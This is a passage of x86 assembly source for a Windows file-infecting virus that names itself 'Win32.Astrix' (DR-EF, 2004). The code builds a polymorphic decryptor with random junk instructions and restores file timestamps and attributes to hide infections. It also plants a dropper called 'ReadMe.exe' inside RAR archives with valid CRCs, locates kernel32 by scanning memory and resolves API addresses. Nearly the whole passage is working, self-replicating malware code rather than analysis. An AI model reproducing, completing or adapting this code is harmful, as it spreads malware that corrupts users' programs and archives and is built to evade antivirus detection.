		sub	[ebp + free_space],5h
		call	write_junk_code
		mov	byte ptr [edi],5eh	;pop esi
		inc	edi
		dec	[ebp + free_space]
		jmp	next_ins3
next_ins:	cmp	al,3ch
		ja	next_ins2
		mov	ebx,dword ptr [ebp + vl_cmd1]
		mov	[edi],ebx
		add	edi,4h
		sub	[ebp + free_space],4h
		mov	bl,byte ptr [ebp + vl_cmd1 + 4h]
		mov	byte ptr [edi],bl
		inc 	edi
		sub	[ebp + free_space],5h
		jmp	next_ins3
next_ins2:	call	[ebp + _GetTickCount]
		cmp	al,7fh
		ja	put_sub	
		mov	word ptr [edi],0f633h	;xor esi,esi
		jmp	sub_ok
put_sub:	mov	word ptr [edi],0f62bh	;sub esi,esi
sub_ok:		add	edi,2h
		call	write_junk_code
		mov	word ptr [edi],0f681h	;xor esi
		mov	ebx,dword ptr [ebp + vl_cmd1 + 1h]
		mov	dword ptr [edi + 2h],ebx
		add	edi,6h
		sub	[ebp + free_space],8h
next_ins3:	call	write_junk_code
		call	[ebp + _GetTickCount]
		cmp	al,7fh
		ja	next_ins4
		mov	bl,byte ptr [ebp + vl_cmd2]
		mov	byte ptr [edi],bl
		inc	edi
		dec	[ebp + free_space]
		jmp	next_ins5
next_ins4:	mov	byte ptr [edi],68h	;push
		inc	edi
		mov	ebx,dword ptr [ebp + vl_cmd1 + 1h]
		mov	dword ptr [edi],ebx
		add	edi,4h
		sub	[ebp + free_space],5h
next_ins5:	call	write_junk_code
		call	[ebp + _GetTickCount]
		cmp	al,7fh
		ja	next_ins6
		mov	byte ptr [edi],68h	;push
		inc	edi
		mov	ebx,dword ptr [ebp + vl_cmd1 + 1h]
		mov	dword ptr [edi],ebx
		add	edi,4h
		mov	byte ptr [edi],5fh	;pop edi
		inc	edi
		sub	[ebp + free_space],5h
		jmp	next_ins7
next_ins6:	mov	bx,word ptr [ebp + vl_cmd3]
		mov	word ptr [edi],bx
		add	edi,2h
		sub	[ebp + free_space],2h
next_ins7:	call	write_junk_code
		call	[ebp + _GetTickCount]
		cmp	al,7fh
		ja	next_ins8
		mov	ebx,dword ptr [ebp + vl_cmd4]
		mov	dword ptr [edi],ebx
		add	edi,4h
		mov	bl,byte ptr[ebp + vl_cmd4 + 4h]
		mov	byte ptr [edi],bl
		push	edi
		inc	edi
		sub	[ebp + free_space],5h
		jmp	next_ins9
next_ins8:	mov	byte ptr [edi],0b9h
		mov	dword ptr [edi + 1h],not (virus_size/2)
		add	edi,5h
		call	write_junk_code
		mov	word ptr [edi],0d1f7h	;not ecx
		inc	edi
		push	edi
		inc	edi
		sub	[ebp + free_space],7h
next_ins9:	call	write_junk_code
		call	[ebp + _GetTickCount]
		cmp	al,7fh
		jb	put_lods
		;write mov ax,word ptr [esi]
		mov	byte ptr [edi],66h
		inc	edi
		mov	byte ptr [edi],8bh
		inc	edi
		mov	byte ptr [edi],06h
		inc	edi
		call	write_junk_code
		;write add esi,2h
		mov	byte ptr [edi],83h
		inc	edi
		mov	byte ptr [edi],0c6h
		inc	edi
		mov	byte ptr [edi],02h
		inc	edi
		jmp	___1
put_lods:	mov	bx,word ptr [ebp + vl_cmd5]
		mov	word ptr [edi],bx
		add	edi,2h
		sub	[ebp + free_space],2h
___1:		call	write_junk_code
		mov	bx,word ptr [ebp + vl_cmd6]
		mov	word ptr [edi],bx
		add	edi,2h
		sub	[ebp + free_space],2h
		call	write_junk_code
		mov	ebx,dword ptr [ebp + vl_cmd7]
		mov	dword ptr [edi],ebx
		add	edi,3h
		sub	[ebp + free_space],3h
		call	write_junk_code
		mov	ebx,dword ptr [ebp + vl_cmd8]
		mov	dword ptr [edi],ebx
		add	edi,4h
		sub	[ebp + free_space],4h
		call	write_junk_code
		mov	bx,word ptr [ebp + vl_cmd9]
		mov	word ptr [edi],bx
		add	edi,2h
		sub	[ebp + free_space],2h
		call	write_junk_code
		call	[ebp + _GetTickCount]
		cmp	al,7fh
		ja	stos_
		;build	mov word ptr [edi],ax
		mov	byte ptr [edi],66h
		inc	edi
		mov	byte ptr [edi],89h
		inc	edi
		mov	byte ptr [edi],7h
		inc	edi
		sub	[ebp + free_space],3h
		call	write_junk_code
		;build 	add edi,2h
		mov	byte ptr [edi],83h
		inc	edi
		mov	byte ptr [edi],0c7h
		inc	edi
		mov	byte ptr [edi],2h
		inc	edi
		sub	[ebp + free_space],3h
		jmp	_1	
stos_:		mov	ax,word ptr [ebp + vl_cmd10]
		stosw
		sub	[ebp + free_space],2h
_1:		call	write_junk_code
		; build loop offset:
		mov	bl,byte ptr [ebp + vl_cmd11]
		mov	byte ptr [edi],bl
		inc	edi
		pop	ecx
		mov	ebx,edi
		sub	ecx,ebx
		mov	byte ptr [edi],cl	
		inc	edi
		sub	[ebp + free_space],4h
		call	write_junk_code
		mov	bx,word ptr [ebp + vl_cmd12]
		mov	word ptr [edi],bx
		add	edi,2h
		mov	bl,byte ptr [ebp + vl_cmd12+2h]
		mov	byte ptr [edi],bl
		inc	edi		
		sub	[ebp + free_space],3h
		call	write_junk_code
		mov	bx,word ptr [ebp + vl_cmd13]
		mov	word ptr [edi],bx
		add	edi,2h
		mov	bl,byte ptr [ebp + vl_cmd13+2h]
		mov	byte ptr [edi],bl
		inc	edi
		sub	[ebp + free_space],3h
		call	write_junk_code
		call	[ebp + _GetTickCount]
		cmp	al,7fh
		ja	exception1
		mov	word ptr [edi],0f1f7h	;div ecx
		jmp	end_exception
exception1:	mov	bx,word ptr [ebp + vl_cmd14]
		mov	word ptr [edi],bx
end_exception:	add	edi,2h
		sub	[ebp + free_space],2h
		call	write_junk_code
		;add more junk code after the virus decryptor
		call	[ebp + _GetTickCount]
		mov	ecx,[ebp + free_space]
more_junk:	ror	eax,cl
		stosd
		loop	more_junk
		;finish infection
		pop	eax
		pop	ecx
		push	FILE_BEGIN
		push	0h
		mov	eax,[ebp + nFileSizeLow]
		add	eax,virus_size
		call	pad_size
		push	eax
		push	[ebp + opened_file_handle]
		call	[ebp + _SetFilePointer]
		push	[ebp + opened_file_handle]
		call	[ebp + _SetEndOfFile]
		inc	[ebp + infection_counter]
error_unmap:
		;remove SEH
		pop	dword ptr fs:[0]
		add	esp,4h
		popad
_error_unmap:	push	[ebp + map_base]
		call	[ebp + _UnmapViewOfFile]
error_close_map:
		push	[ebp + map_handle]
		call	[ebp + _CloseHandle]
error_close_file:
		lea	eax,[ebp + last_write_time]
		push	eax
		lea	eax,[ebp + last_access_time]
		push	eax
		lea	eax,[ebp + creation_time]
		push	eax
		push	[ebp + opened_file_handle]
		call	[ebp + _SetFileTime]
		push	[ebp + opened_file_handle]
		call	[ebp + _CloseHandle]
error:
		lea	ebx,[ebp + cFileName]
		push	[ebp + file_old_attributes]
		push	ebx
		call	[ebp + _SetFileAttributes]
error_1:
		ret
_infection_error_handle:
		mov	esp,[esp + 8h]
		pop	dword ptr fs:[0]
		add	esp,4h
		popad
		jmp	_error_unmap
write_junk_code:				;simple & lame poly
		cmp	[ebp + free_space],0bh
		jbe	exit_junk
		call	random_number
		cmp	al,7fh
		ja	write_junk2
		call	random_number
		and	eax,1eh
		mov	ecx,4h
		mul	ecx
		xchg	ecx,eax
		lea	eax,[ebp + junk_code_4]
		add	eax,ecx
		mov	eax,[eax]
		stosd
		jmp	exit_junk
write_junk2:
		call	random_number
		and	eax,1eh
		mov	ecx,2h
		mul	ecx
		xchg	ecx,eax
		lea	eax,[ebp + junk_code_2]
		add	eax,ecx
		mov	ax,word ptr [eax]
		stosw
		call	random_number
		cmp	al,7fh
		jb	exit_junk
write_junk:
		and	eax,4h
		xchg	eax,ecx
		lea	eax,[ebp + junk_code]
		add	eax,ecx
		mov	al,byte ptr [eax]
		stosb
exit_junk:	ret
junk_code_4:
	db	0d1h,0c8h,0d1h,0c0h	;ror\rol eax,1
	db	0f7h,0d8h,0f7h,0d8h	;neg eax,neg eax
	db	33h,0c3h,33h,0c3h	;xor eax,ebx
	db	0ebh,0h,90h,90h		;jmp-> nop,nop
	db	90h,0f9h,90h,0f8h	;nop,stc,nop,clc
	db	60h,61h,23h,0c9h	;and ecx,ecx,pushad\popad
	db	0f7h,0d0h,0f7h,0d0h	;not eax,not eax
	db	0d3h,0dbh,0d3h,0d3h	;rcr\rcl ebx,cl
	db	33h,0c8h,33h,0c8h	;xor ecx,eax
	db	23h,0edh,51h,59h	;and ebp,ebp,push\pop ecx
	db	90h,9ch,90h,9dh		;nop,nop...
	db	40h,48h,50h,58h		;inc\dec eax,push\pop eax
	db	91h,91h,48h,40h		;xchg eax,ecx,dec\inc eax
	db	53h,05bh,93h,93h	;push\pop ebx,xchg eax,ebx
	db	23h,0c0h,51h,59h	;and eax,eax,push\pop ecx
	db	0ebh,0h,0f9h,0f8h	;jmp-> stc,clc
junk_code_2:
	db	50h,58h			;push\pop eax
	db	0ebh,0h			;jmp
	db	23h,0e4h		;and esp,esp
	db	23h,0f6h		;and esi,esi
	db	55h,5dh			;push\pop ebp
	db	0f8h,0f9h		;clc\stc
	db	22h,0dbh		;and bl,bl
	db	0f9h,90h		;stc,nop
	db	0d9h,0d0h		;fnop
	db	70h,0h			;jo
	db	71h,0h			;jno
	db	72h,0h			;jc
	db	73h,0h			;jae
	db	74h,0h			;jz
	db	75h,0h			;jne
	db	76h,0h			;jna
	db	77h,0h			;ja
	db	78h,0h			;js
	db	79h,0h			;jns
	db	7ah,0h			;jp
	db	7bh,0h			;jnp
	db	7ch,0h			;jl
	db	7dh,0h			;jnl
	db	7eh,0h			;jle
	db	7fh,0h			;jg
	db	0e3h,0h			;jecxz
	db	90h,0f8h		;nop\clc
	db	47h,4fh			;inc\dec edi
	db	23h,0ffh		;and edi,edi
	db	23h,0d2h		;and edx,edx
junk_code:
	db	90h			;nop
	db	0f8h			;clc
	db	0f9h			;stc
	db	0fch			;cld
	db	0f5h			;cmc
canot_infect_file:
		pop	eax	;restore stack
		pop	eax
cant_infect:	push	FILE_BEGIN
		push	0h
		mov	eax,[ebp + nFileSizeLow]
		call	pad_size
		push	eax
		push	[ebp + opened_file_handle]
		call	[ebp + _SetFilePointer]
		push	[ebp + opened_file_handle]
		call	[ebp + _SetEndOfFile]
		jmp	error_unmap
;eax - file size
pad_size:
		push	eax
		xor	edx,edx
		mov	ecx,65h	;101d
		div	ecx
		cmp	edx,0h
		je	no_pad
		sub	ecx,edx
		xchg	ecx,edx
no_pad:		pop	eax
		add	eax,edx
		ret
		
;return random one byte instruction in eax
_get_byte:	push	ebx
		call	[ebp + _GetTickCount]
		cmp	al,32h
		ja	byte1
		mov	eax,90h
		jmp	end_get_byte
byte1:		cmp	al,64h
		ja	byte2
		mov	eax,0f8h
		jmp	end_get_byte
byte2:		cmp	al,96h
		ja	byte3
		mov	eax,0f5h
		jmp	end_get_byte
byte3:		cmp	al,0c8h
		ja	byte4
		mov	eax,0f9h
		jmp	end_get_byte
byte4:		mov	eax,0fch
end_get_byte:	pop	ebx
		ret
		
		
infect_rar:
		
		;do not infect files that are bigger than 3mb
		cmp	[ebp + nFileSizeLow],300000h
		ja	rar_infect_err
		mov	ebx,[ebp + dwFileAttributes]
		mov	[ebp + file_old_attributes],ebx
		lea	ebx,[ebp + cFileName]
		push	FILE_ATTRIBUTE_NORMAL
		push	ebx
		call	[ebp + _SetFileAttributes]
		cmp	eax,0h
		je	rar_infect_err
		;allocate memory & create crc table
		push	SizeOfTable
		push	GPTR
		call	[ebp + _GlobalAlloc]
		cmp	eax,0h
		je	rar_infect_err
		mov	dword ptr [ebp + crc_table],eax
		call	create_crc_table
_infect_rar:	;get the infected file name
		push	0ffh
		lea	eax,[ebp + infected_file]
		push	eax
		push	0h
		call	[ebp + _GetModuleFileName]
		cmp	eax,0h
		je	rar_infect_err
		;open the infected file
		xor	eax,eax
		push	eax
		push	eax
		push	OPEN_EXISTING
		push	eax
		push	FILE_SHARE_READ
		push	GENERIC_READ
		lea	eax,[ebp + infected_file]
		push	eax
		call	[ebp + _CreateFile]
		cmp	eax,INVALID_HANDLE_VALUE
		je	rar_infect_err
		mov	dword ptr [ebp + file_handle1],eax
		;get the infected file size
		push	0h
		push	eax
		call	[ebp + _GetFileSize]
		cmp	eax,INVALID_HANDLE_VALUE
		je	rar_infect_err
		mov	dword ptr [ebp + dropper_size],eax
		;create file mapping object for the dropper
		xor	eax,eax
		push	eax
		push	eax
		push	eax
		push	PAGE_READONLY
		push	eax
		push	dword ptr [ebp + file_handle1]
		call	[ebp + _CreateFileMapping]
		cmp	eax,0h
		je	rar_close_file
		mov	dword ptr [ebp + map_handle1],eax
		;map view of file:
		xor	eax,eax
		push	eax
		push	eax
		push	eax
		push	FILE_MAP_READ
		push	dword ptr [ebp + map_handle1]
		call	[ebp + _MapViewOfFile]
		cmp	eax,0h
		je	rar_close_map
		mov	dword ptr [ebp + map_base1],eax
		;open the rar file
		lea	ebx,[ebp + cFileName]
		call	open_file
		cmp	eax,INVALID_HANDLE_VALUE
		je	rar_unmap1
		mov	dword ptr [ebp + opened_file_handle],eax
		mov	eax,[ebp + nFileSizeLow]
		add	eax,[ebp + dropper_size]
		add	eax,RarHeaderSize
		sub	eax,7h
		push	eax	;save new size of rar
		;create file mapping of the rar file
		call	create_map
		cmp	eax,0h
		je	rar_close_file1
		mov	dword ptr [ebp + map_handle],eax
		;map view of rar file
		pop	eax
		call	map_view
		cmp	eax,0h
		je	rar_close_map1
		mov	dword ptr [ebp + map_base],eax
		;check if the rar file is valid rar archive
		cmp	dword ptr [eax],"!raR"
		jne	canot_infect_rar
		;check if the rar is already infected:
		cmp	byte ptr [eax + 0fh],01h
		je	canot_infect_rar
		;start to infect the rar file:
		;get crc32 of the infected dropper:
		mov	edi,[ebp + dropper_size]
		mov	esi,[ebp + map_base1]
		call	get_crc
		mov	dword ptr [ebp + FILE_CRC],eax
		;set random time\data in the rar header:
		mov	eax,dword ptr [ebp + ftCreationTime + 4]
		mov	dword ptr [ebp + FTIME],eax
		;set size of dropper in the rar header:
		mov	eax,[ebp + dropper_size]
		mov	[ebp + PACK_SIZE],eax
		mov	[ebp + UNP_SIZE],eax
		;set the crc of the rar header in the rar header:
		lea	esi,[ebp + headcrc]
		mov	edi,(EndRarHeader-RarHeader-2)
		call	get_crc
		mov	word ptr [ebp + HEAD_CRC],ax
		;write the rar header:
		lea	esi,[ebp + RarHeader]
		mov	edi,[ebp + map_base]
		add	edi,[ebp + nFileSizeLow]
		sub	edi,7h	;overwrite the end of archive sign
		push	edi
		mov	ecx,RarHeaderSize
		rep	movsb
		;write the infected dropper:
		mov	esi,[ebp + map_base1]
		pop	edi
		add	edi,RarHeaderSize
		mov	ecx,[ebp + dropper_size]
		rep	movsb
		;mark the file as infected:
		mov	eax,dword ptr [ebp + map_base]
		push	eax
		inc	byte ptr [eax + 0fh]	;reserved1
		mov	esi,eax
		add	esi,9h
		mov	edi,0bh
		call	get_crc		;get crc32 of the main rar header
		pop	ebx
		mov	word ptr [ebx + 7h],ax ;[ebx + 7h]=HEAD_CRC
unmap_rar:	push	dword ptr [ebp + map_base]
		call	[ebp + _UnmapViewOfFile]
rar_close_map1:
		push	dword ptr [ebp + map_handle]
		call	[ebp + _CloseHandle]
rar_close_file1:
		push	dword ptr [ebp + opened_file_handle]
		call	[ebp+ _CloseHandle]
rar_unmap1:
		push	dword ptr [ebp + map_base1]
		call	[ebp + _UnmapViewOfFile]
rar_close_map:
		push	dword ptr [ebp + map_handle1]
		call	[ebp + _CloseHandle]
rar_close_file:
		push	dword ptr [ebp + file_handle1]
		call	[ebp + _CloseHandle]
		lea	ebx,[ebp + cFileName]
		push	[ebp + file_old_attributes]
		push	ebx
		call	[ebp + _SetFileAttributes]
rar_infect_err:
		;free the crc32 table memory
		push	dword ptr [ebp + crc_table]
		call	[ebp  + _GlobalFree]
		ret
canot_infect_rar:
		push	FILE_BEGIN
		push	0h
		push	dword ptr [ebp + nFileSizeLow]
		push	dword ptr [ebp + opened_file_handle]
		call	[ebp + _SetFilePointer]
		push	dword ptr [ebp + opened_file_handle]
		call	[ebp + _SetEndOfFile]
		jmp	unmap_rar
		;create a crc32 table
create_crc_table:
		mov	edi,dword ptr [ebp + crc_table]
		xor	ecx,ecx
@2:		push	ecx
		mov	eax,ecx
		mov	ecx,8h
@1:		mov	edx,eax
		and	edx,1h
		jne	equ_1
		shr	eax,1h
		jmp	__1
equ_1:		shr	eax,1h
		xor	eax,polynomial
__1:		loop	@1
		stosd
		pop	ecx
		inc	ecx
		cmp	ecx,100h
		jb	@2
		ret
get_crc:
;edi - data size
;esi - start address
		xor	ecx,ecx
		mov	ebx,0ffffffffh
@crc:		push	ecx
		xor	eax,eax
		lodsb
		mov	edx,ebx
		shr	ebx,8h
		push	ebx
		xchg	edx,ebx
		and	ebx,0ffh
		xor	ebx,eax
		xchg	eax,ebx
		mov	ecx,4h
		mul	ecx
		xchg	eax,ebx
		mov	eax,dword ptr [ebp + crc_table]
		add	eax,ebx
		mov	eax,dword ptr [eax]
		pop	ebx
		xor	eax,ebx
		mov	ebx,eax
		pop	ecx
		inc	ecx
		cmp	ecx,edi
		jb	@crc
		not	eax
		ret
		
		SizeOfTable	equ	400h
		polynomial	equ	0edb88320h
		dropper_size	dd	0
		file_handle1	dd	0
		map_handle1	dd	0
		map_base1	dd	0
		crc_table_created	db	0
		crc_table	dd	0
		
		;---------------RAR Header---------------
	RarHeader:
		HEAD_CRC	dw	0h
	headcrc:HEAD_TYPE	db	74h
		HEAD_FLAGS	dw	8000h	;normal flag
		HEAD_SIZE	dw	RarHeaderSize
		PACK_SIZE	dd	0h
		UNP_SIZE	dd	0h
		HOST_OS		db	0h	;Ms-Dos
		FILE_CRC	dd	0h
		FTIME		dd	0h
		UNP_VER		db	14h
		METHOD		db	30h	;storing
		NAME_SIZE	dw	0ah	;file name size
	endhcrc:ATTR		dd	0h
		FILE_NAME	db	"ReadMe.exe"
		EndRarHeader:
		RarHeaderSize	equ (EndRarHeader-RarHeader)
		;----------------------------------------
		
		;open file with read\write access:
		;ebx - address of filename
open_file:
		xor	eax,eax
		push	eax
		push	FILE_ATTRIBUTE_NORMAL
		push	OPEN_EXISTING
		push	eax
		push	eax
		push	GENERIC_READ or GENERIC_WRITE
		push	ebx
		call	[ebp + _CreateFile]
		ret
		;create file mapping object
		;eax	- size of map or zero
create_map:
		xor	edx,edx
		push	edx
		push	eax
		push	edx
		push	PAGE_READWRITE
		push	edx
		push	[ebp + opened_file_handle]
		call	[ebp + _CreateFileMapping]
		ret
		;map view of file:
		;eax - size of map or zero
map_view:
		push	eax
		xor	eax,eax
		push	eax
		push	eax
		push	FILE_MAP_WRITE
		push	[ebp + map_handle]
		call	[ebp + _MapViewOfFile]
		ret
get_apis:
;ecx - number of apis
;eax - address to api strings
;ebx - address to api address
;edx - module handle
next_api:	push	ecx
		push	edx
		push	eax
		push	eax
		push	edx
		call	[ebp + _GetProcAddress]
		cmp	eax,0h
		je	cant_get_apis
		mov	dword ptr [ebx],eax
		pop	eax
		;start to get the next string:
next_string:	inc	eax
		cmp	byte ptr [eax],0h
		jne	next_string
		inc	eax
		add	ebx,4h
		pop	edx
		pop	ecx
		loop	next_api
		stc
		ret
cant_get_apis:	add	esp,0ch
		clc
		ret
;Find Kernel Base Address
;************************
find_kernel:
		mov	eax,0bff70000h	;win9X
		call	search_kernel
		jc	kernel_is_founded
		mov	eax,0bff60000h	;winME
		call	search_kernel
		jc	kernel_is_founded
		mov	eax,804d4000h	;winXP
		call	search_kernel
		jc	kernel_is_founded
		mov	eax,77f00000h	;winNT
		call	search_kernel
		jc	kernel_is_founded
		mov	eax,77e70000h	;win2K
		call	search_kernel
		jc	kernel_is_founded
		clc
		ret
kernel_is_founded:
		stc
		ret
search_kernel:
		pushad
		lea	ebx,[ebp + k32find_err]
		push	ebx
		push	dword ptr fs:[0]	;set SEH
		mov	fs:[0],esp
		xor	ax,ax
		mov	ebx,eax
next_page:	cmp	word ptr [eax],"ZM"
		jne	move_to_next_pg
		mov	ebx,eax
		add	eax,[eax + 3ch]
		cmp	word ptr [eax],"EP"
		je	kernel_ok
move_to_next_pg:xchg	eax,ebx
		sub	eax,1000h
		jnz	next_page
kernel_ok:	pop	dword ptr fs:[0]	;remove SEH
		add	esp,4h
		xchg	eax,ebx
		mov	[ebp + kernel_base],eax
		popad
		stc
		ret
k32find_err:	mov	esp,[esp + 8h]
		pop	dword ptr fs:[0]	;remove SEH
		add	esp,4h
		popad
		clc
		ret
;get the GetProcAddress API
;*******************************
get_proc_addr:
		mov	eax,[ebp + offset kernel_base]
		add	eax,[eax + 3ch]
		mov	eax,[eax + 78h]	;eax point to export table !
		add	eax,[ebp + offset kernel_base]
		mov	ebx,[eax + 14h] ;get the numbers of exported functions
		mov	[ebp + numbers_of_exported_apis],ebx ;save it
		mov	ebx,[eax + 1Ch]
		add	ebx,[ebp + offset kernel_base] ; get address of api addresses array
		mov	[ebp + address_of_apis],ebx ; save it
		mov	ebx,[eax + 20h]
		add	ebx,[ebp + offset kernel_base]
		mov	ebx,[ebx]
		add	ebx,[ebp + offset kernel_base] ; get address of api names array
		push	ebx ; save it
		mov	ebx,[eax + 24h]	;get address of api ordinals array
		add	ebx,[ebp + offset kernel_base]
		mov	[ebp + address_of_apis_ordinals],ebx ; save it
		;search the "GetProcAddress" string in the names array:
		
		; edi - pointer to names array
		; esi - pointer to "GetProcAddress" string
		; ecx - will hold the ordianl number
		xor	ecx,ecx	
		pop	edi
next_l:		lea	esi,[ebp + get_proc_address]
		cmpsb
		je	check_word
		cmp	byte ptr [edi],00h
		jne	not_inc
		inc	ecx
not_inc:	
		cmp	ecx,[ebp + numbers_of_exported_apis]
		jne	next_l
check_word:
		push	ecx
		mov	ecx,0eh		;check 14 bytes
check_loop:	cmpsb
		jne	not_match
		loop	check_loop
		pop	ecx
		jmp	founded
not_match:
		pop	ecx
		jmp	next_l
founded:
		;get the function:
		shl	cx,1h
		mov	ebx,[ebp + address_of_apis_ordinals]
		add	ebx,ecx
		mov	cx,word ptr [ebx]
		shl	ecx,2h
		add	ecx,[ebp + address_of_apis]
		mov	ecx,[ecx]
		add	ecx,[ebp + kernel_base]
		mov	[ebp + _GetProcAddress],ecx ; save it
		ret

copyright	db	"Win32.Astrix Virus Coded By DR-EF All Right Reserved",0
		;apis:
		get_proc_address db	"GetProcAddress",0
api_strings:	FindFirstFile	db	"FindFirstFileA",0
		FindNextFile	db	"FindNextFileA",0
		GetCurrentDirectory	db "GetCurrentDirectoryA",0
		SetCurrentDirectory	db "SetCurrentDirectoryA",0
		CreateFile	db	"CreateFileA",0
		CloseHandle	db	"CloseHandle",0
		CreateFileMapping	db "CreateFileMappingA",0
		MapViewOfFile	db 	"MapViewOfFile",0
		UnmapViewOfFile	db 	"UnmapViewOfFile",0
		GetTickCount	db 	"GetTickCount",0
		SetFileAttributes	db	"SetFileAttributesA",0
		LoadLibrary	db	"LoadLibraryA",0
		SetFilePointer	db	"SetFilePointer",0
		SetEndOfFile	db	"SetEndOfFile",0
		GlobalAlloc	db	"GlobalAlloc",0
		GlobalFree	db	"GlobalFree",0
		GetModuleFileName	db	"GetModuleFileNameA",0
		GetLocalTime	db	"GetLocalTime",0
		GetFileTime	db	"GetFileTime",0
		SetFileTime	db	"SetFileTime",0
		GetFileSize	db	"GetFileSize",0
		kernel_base	dd	0
		_GetProcAddress	dd	0
api_addresses:	_FindFirstFile	dd	0
		_FindNextFile	dd	0
		_GetCurrentDirectory	dd	0
		_SetCurrentDirectory	dd	0
		_CreateFile	dd	0
		_CloseHandle	dd	0
		_CreateFileMapping	dd 0
		_MapViewOfFile	dd	0
		_UnmapViewOfFile	dd 0
		_GetTickCount	dd	0
		_SetFileAttributes	dd	0
		_LoadLibrary	dd	0
		_SetFilePointer	dd	0
		_SetEndOfFile	dd	0
		_GlobalAlloc	dd	0
		_GlobalFree	dd	0
		_GetModuleFileName	dd	0
		_GetLocalTime	dd	0
		_GetFileTime	dd	0
		_SetFileTime	dd	0
		_GetFileSize	dd	0
		;--------------- export table:
		numbers_of_exported_apis dd 0
		address_of_apis	dd 0
		address_of_apis_ordinals dd 0
		number_of_apis	equ	15h
		;-----------------------------
		max_path	equ	260
		OPEN_EXISTING	equ	3
		FILE_SHARE_READ	equ	1
		FILE_ATTRIBUTE_NORMAL	equ	00000080h
		GENERIC_WRITE	equ	40000000h
		GENERIC_READ	equ	80000000h
		PAGE_READWRITE	equ	4h
		PAGE_READONLY	equ	2h
		FILE_MAP_WRITE	equ	00000002h
		FILE_MAP_READ	equ	00000004h
		FILE_BEGIN	equ	0
		GPTR		equ	0040h
		allocated_memory_handle	dd	0
		opened_file_handle	dd	0
		map_handle		dd	0
		map_base		dd	0
		;FILETIME structures
		creation_time:
			dd	0,0
		last_access_time:
			dd	0,0
		last_write_time:
			dd	0,0
		;WIN32_FIND_DATA structure
		WIN32_FIND_DATA:
		dwFileAttributes	dd	0
		ftCreationTime		dq	0
		ftLastAccessTime	dq	0
		ftLastWriteTime		dq	0
		nFileSizeHigh		dd	0
		nFileSizeLow		dd	0
		dwReserved0		dd      0
		dwReserved1		dd      0
		cFileName		db      max_path dup (0)
		cAlternateFileName	db	14 dup (0)
		;file search:
		search_mask	db	"*.*",0
		INVALID_HANDLE_VALUE	equ	-1
		Current_Directory	db	max_path dup (0)
		directory_name_size	dd	0
		file_handle	dd	0
		;infection data:
		infection_counter	db	0
		number_of_sections	dw	0
		file_alignment		dd	0
		host_image_base		dd	0
		number_directories_entries	dd	0
		last_section	dd	0
		where_to_write_decryptor	dd	0
		file_old_attributes	dd	0
		free_space	dd	0
		infected_file	db	0ffh	dup(0)
		;registry functions:
		advapi32_dll	db	"Advapi32.dll",0
reg_funcs:	RegOpenKeyEx	db	"RegOpenKeyExA",0
		RegQueryValueEx	db	"RegQueryValueExA",0
		RegCloseKey	db	"RegCloseKey",0
		RegSetValueExA	db	"RegSetValueExA",0
reg_funcs_add:	_RegOpenKeyEx	dd	0
		_RegQueryValueEx	dd	0
		_RegCloseKey	dd	0
		_RegSetValueExA	dd	0
		HKEY_CURRENT_USER	equ	80000001h
		KEY_QUERY_VALUE	equ	0001h
		ERROR_SUCCESS	equ	0h
		KEY_WRITE	equ	00020006h
		REG_DWORD	equ	4h
		hkey	dd	0

virus_decryptor:	;normal virus decryptor
vl_cmd1:	mov_esi_virus_ep	db 0beh,0,0,0,0
vl_cmd2:	push	esi
vl_cmd3:	mov	edi,esi
vl_cmd4:	mov	ecx,(virus_size/2)
vl_cmd5:	lodsw
vl_cmd6:	sub	al,cl
vl_cmd7:	rol	ax,cl
vl_cmd8:	xor_ax_key	db	66h,35h,0,0
vl_cmd9:	ror	ah,1h
vl_cmd10:	stosw
vl_cmd11:	db	0e2h,(vl_cmd4-vl_cmd11)	;loop	vl_cmd5	;decrypt
vl_cmd12:	push	dword ptr fs:[ecx]
vl_cmd13:	mov	fs:[ecx],esp
vl_cmd14:	mov	dword ptr [ecx],eax
end_virus_decryptor:
decrypt_virus:
		pop	edi
		push	edi
		mov	esi,edi
		mov	ecx,(decrypt_virus-start_ecrypt)
decrypt_v:	lodsb
		push	ecx
		xor_al_key	db	34h,00h
		mov_cl_key	db	0b1h,00h
		ror	al,cl
		pop	ecx
		stosb
		loop	decrypt_v
		push	dword ptr fs:[ecx]	;set SEH
		mov	fs:[ecx],esp
		mov	dword ptr [ecx],ebx	;return to the virus
End_Astrix:

fake_host:
		xor	ebp,ebp	;first generation delta offset
		push	offset fake_host_p
		pushad
		jmp	first_g
fake_host_p:	push	40h	;first generation host
		push	offset virus_name
		push	offset virus_info
		push	0h
		call	MessageBoxA
		push	eax
		call	ExitProcess
		virus_info	db	"Astrix Virus Version 1.0 (c) 2004 DR-EF All Rights Reserved !",0
		virus_name	db	"Astrix Virus Dropper.",0
end fake_host
